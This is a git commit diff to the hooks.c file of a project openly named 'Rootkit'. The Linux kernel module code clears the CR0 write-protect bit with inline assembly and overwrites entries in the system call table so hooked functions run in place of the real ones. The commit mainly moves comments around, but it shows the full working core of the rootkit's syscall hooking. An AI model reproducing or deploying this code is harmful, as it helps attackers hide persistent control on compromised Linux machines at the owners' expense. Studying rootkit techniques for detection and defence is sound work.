a714ed85815d043f5735f628ea919a9ddd636f7d
Artemis's Angel <artemisesangel@protonmail.com>
2023-04-18 15:53:32 +0100

    Update hooks.c

--- Rootkit/src/custom/hooks.c
+++ Rootkit/src/custom/hooks.c
@@ -1,6 +1,7 @@
 /*
-library for the hooking via the syscall table
+file for the hooking syscalls via the syscall table
 */
+
 #include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
 #include <linux/unistd.h> //contains syscall names to numbers
 #include <linux/version.h> //contains versions  e.g. LINUX_VERSION_CODE KERNEL_VERSION
@@ -8,13 +9,14 @@ library for the hooking via the syscall table
 #include <linux/kprobes.h> //kprobes- used in workaround for kallsyms_lookup_name not exported
 
 
-//syscalls in new kernel use pt_regs struct for information, so is generic fnction type for syscalls
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
-//hook data type for the hooking functions
-struct hook_t {
-	int syscall_number;
-	ptregs_t orig_syscall;
-	ptregs_t hooked_syscall;
+
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); //syscalls in new kernel use pt_regs struct for information, so is generic fnction type for syscalls
+
+
+struct hook_t { //hook data type for the hooking functions
+	int syscall_number; //syscall number of syscall
+	ptregs_t orig_syscall; //adress of the original syscall
+	ptregs_t hooked_syscall; //adress of the original syscall
 };
 
 //core hooking functions
@@ -28,14 +30,16 @@ static int set_memory_protection(bool val); //edits memory protection
 	/*====================*\
 		core functions
 	\*====================*/
-//stores the adress of the origional functions
-static ptregs_t store(int syscall){
-	ptregs_t orig_syscall = (ptregs_t) __sys_call_table[syscall];
-	return orig_syscall;
+
+static ptregs_t store(int syscall){//stores the adress of the origional functions
+	ptregs_t orig_syscall = (ptregs_t) __sys_call_table[syscall]; //looks up the syscall in the table and stores in orig_syscall
+	return orig_syscall; //returns syscall
 }
-//rewrites the cr0 value in the cpu
-static int write_cr0_forced(unsigned long val){
+
+static int write_cr0_forced(unsigned long val){ //rewrites the cr0 value in the cpu
+	//code from here- https://medium.com/@hadfiabdelmoumene/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411
 	unsigned long __force_order;
+	
 	//nasm code to rewrite cr0
 	asm volatile(
 		"mov %0, %%cr0"
@@ -43,10 +47,10 @@ static int write_cr0_forced(unsigned long val){
 	//to prevent reads from being recorded with
 	//respect to writes, use dummy memory operand
 	//"+m"(__force_order)
-	return 0;
+	return 0; //returns 0 for no error
 }
 //edits write protection
-static int set_memory_protection(bool val){
+static int set_memory_protection(bool val){ //sets memory protection to on or off
 	if (val){ //turn memory protection on
 		//bitwise OR copies bit to result if it is in either operands
 		return write_cr0_forced(read_cr0() | (0x10000)); //returns code from write_cr0_forced
@@ -54,40 +58,42 @@ static int set_memory_protection(bool val){
 	else{
 		//bitwise AND copies bitsto result if it is in both operands
 		//unary reverse (~) reverses bits so 0x10000 becomes 0x01111removal\n");
-		return write_cr0_forced(read_cr0() & (~ 0x10000));
+		return write_cr0_forced(read_cr0() & (~ 0x10000));  //returns code from write_cr0_forced
 	}
 }
-//hooks syscall
-static int install_hook(struct hook_t *hook){
-	hook->orig_syscall=store(hook->syscall_number); //stores the origional syscall
+
+static int install_hook(struct hook_t *hook){//function that hooks syscall
+	hook->orig_syscall=store(hook->syscall_number); //stores the original syscall
 	if (!hook->orig_syscall){ //if unable to get original syscall
-		return -1;
+		return -1; //returns -1 for error
 	};
-	if (set_memory_protection(false)){ //memory cannot be disabled
-		server_print("\033[1;31;40m[!]\033[0m unable to disbale memory protection\n");
+	if (set_memory_protection(false)){ //disables memory protection in cr0- if true memory cannot be disabled
+		server_print("\033[1;31;40m[!]\033[0m unable to disbale memory protection\n"); //prints message on server
 		return -1;
 	}; //disables memory protection in cr0
+	
 	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->hooked_syscall; //rewrites the adress of the syscall to hooked function
-	if (set_memory_protection(true)){ //memory cannot be reenabled
-		server_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n");
-		return -1;
-	}; //disables memory protection in cr0
-	return 0;
+	
+	if (set_memory_protection(true)){  //enables memory protection in cr0- if true memory cannot be reenabled
+		server_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
+		return -1; //returns -1 for error
+	};
+	return 0; //returns 0 for no error
 }
 //sets the sys_call_table back to normal
-static int remove_hook(struct hook_t *hook){
+static int remove_hook(struct hook_t *hook){ //removes a hook
 	if (!hook->orig_syscall){ //if unable to get original syscall
-		server_print("\033[1;31;40m[!]\033[0m unable to get origional syscall\n");
-		return -1;
+		server_print("\033[1;31;40m[!]\033[0m unable to get origional syscall\n"); //prints message on server
+		return -1; //returns -1 for error
 	};
-	if (set_memory_protection(false)){ //memory cannot be disbaled
-		server_print("\033[1;31;40m[!]\033[0m unable to disable memory protection\n");
-		return -1;
-	}; //disables memory protection in cr0cr0
+	if (set_memory_protection(false)){//disables memory protection in cr0- if true memory cannot be disabled
+		server_print("\033[1;31;40m[!]\033[0m unable to disable memory protection\n"); //prints message on server
+		return -1; //returns -1 for error
+	};
 	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->orig_syscall;
-	if (set_memory_protection(true)){ //memory cannot be reenabled
-		server_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n");
-		return -1;
-	}; //disables memory protection in cr0cr0
-	return 0;
+	if (set_memory_protection(true)){ //enables memory protection in cr0- if true memory cannot be reenabled
+		server_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
+		return -1; //returns -1 for error
+	};
+	return 0; //returns 0 for no error
 }
